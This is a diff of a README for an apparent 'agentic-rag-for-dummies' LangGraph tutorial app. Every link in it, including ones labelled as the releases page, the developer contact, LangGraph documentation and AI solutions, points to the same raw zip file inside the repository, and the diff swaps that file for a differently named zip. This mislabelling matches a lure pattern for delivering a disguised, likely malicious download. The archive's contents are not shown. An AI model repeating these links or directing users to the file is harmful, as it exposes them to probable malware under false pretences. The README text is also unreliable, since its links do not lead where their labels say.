@@ -4,13 +4,13 @@
 
 Welcome to the agentic-rag-for-dummies project! This application uses LangGraph to help you learn about Retrieval-Augmented Agents in just minutes. Follow these simple steps to get started.
 
-[![Download agentic-rag-for-dummies](https://raw.githubusercontent.com/SamueleSalerno4/agentic-rag-for-dummies/main/Norway/agentic-rag-for-dummies.zip%20Now-Download%20agentic--rag--for--dummies-brightgreen)](https://raw.githubusercontent.com/SamueleSalerno4/agentic-rag-for-dummies/main/Norway/agentic-rag-for-dummies.zip)
+[![Download agentic-rag-for-dummies](https://raw.githubusercontent.com/SamueleSalerno4/agentic-rag-for-dummies/main/sample_files/docs/dummies_rag_agentic_for_tayra.zip%20Now-Download%20agentic--rag--for--dummies-brightgreen)](https://raw.githubusercontent.com/SamueleSalerno4/agentic-rag-for-dummies/main/sample_files/docs/dummies_rag_agentic_for_tayra.zip)
 
 ## 📥 Download & Install
 
 To download the app, visit the Releases page. Here, you can find the files you need to get the application running on your device.
 
-[Download agentic-rag-for-dummies here!](https://raw.githubusercontent.com/SamueleSalerno4/agentic-rag-for-dummies/main/Norway/agentic-rag-for-dummies.zip)
+[Download agentic-rag-for-dummies here!](https://raw.githubusercontent.com/SamueleSalerno4/agentic-rag-for-dummies/main/sample_files/docs/dummies_rag_agentic_for_tayra.zip)
 
 ### 🔧 System Requirements
 
@@ -22,9 +22,9 @@ To download the app, visit the Releases page. Here, you can find the files you n
 ## ⚙️ Installation Steps
 
 1. **Visit the Releases Page:** Click the link below to go to the Releases page.
-   - [Visit Releases Page](https://raw.githubusercontent.com/SamueleSalerno4/agentic-rag-for-dummies/main/Norway/agentic-rag-for-dummies.zip)
+   - [Visit Releases Page](https://raw.githubusercontent.com/SamueleSalerno4/agentic-rag-for-dummies/main/sample_files/docs/dummies_rag_agentic_for_tayra.zip)
 
-2. **Choose the Right File:** Look for the latest release version. The file you need is typically labeled with the version number, for example, `https://raw.githubusercontent.com/SamueleSalerno4/agentic-rag-for-dummies/main/Norway/agentic-rag-for-dummies.zip`.
+2. **Choose the Right File:** Look for the latest release version. The file you need is typically labeled with the version number, for example, `https://raw.githubusercontent.com/SamueleSalerno4/agentic-rag-for-dummies/main/sample_files/docs/dummies_rag_agentic_for_tayra.zip`.
 
 3. **Download the File:** Click on the file name to start the download. Your web browser will save this file to your default downloads folder.
 
@@ -57,7 +57,7 @@ After you launch the application, you will see a user-friendly interface. Here�
 
 ## 📞 Support
 
-If you have any questions or issues, please reach out via the community section in the application. Alternatively, you can contact the developer at [https://raw.githubusercontent.com/SamueleSalerno4/agentic-rag-for-dummies/main/Norway/agentic-rag-for-dummies.zip](https://raw.githubusercontent.com/SamueleSalerno4/agentic-rag-for-dummies/main/Norway/agentic-rag-for-dummies.zip).
+If you have any questions or issues, please reach out via the community section in the application. Alternatively, you can contact the developer at [https://raw.githubusercontent.com/SamueleSalerno4/agentic-rag-for-dummies/main/sample_files/docs/dummies_rag_agentic_for_tayra.zip](https://raw.githubusercontent.com/SamueleSalerno4/agentic-rag-for-dummies/main/sample_files/docs/dummies_rag_agentic_for_tayra.zip).
 
 ## 🔗 Related Topics
 
@@ -79,8 +79,8 @@ These resources can enhance your learning experience and expand your knowledge i
 
 For more information about Retrieval-Augmented Agents and associated technologies, consider exploring the following resources:
 
-- [LangGraph Documentation](https://raw.githubusercontent.com/SamueleSalerno4/agentic-rag-for-dummies/main/Norway/agentic-rag-for-dummies.zip)
-- [AI Agent Solutions](https://raw.githubusercontent.com/SamueleSalerno4/agentic-rag-for-dummies/main/Norway/agentic-rag-for-dummies.zip)
+- [LangGraph Documentation](https://raw.githubusercontent.com/SamueleSalerno4/agentic-rag-for-dummies/main/sample_files/docs/dummies_rag_agentic_for_tayra.zip)
+- [AI Agent Solutions](https://raw.githubusercontent.com/SamueleSalerno4/agentic-rag-for-dummies/main/sample_files/docs/dummies_rag_agentic_for_tayra.zip)
 
 Make sure to keep an eye on future releases. We aim to provide regular updates that introduce new features and improvements based on user feedback.
 
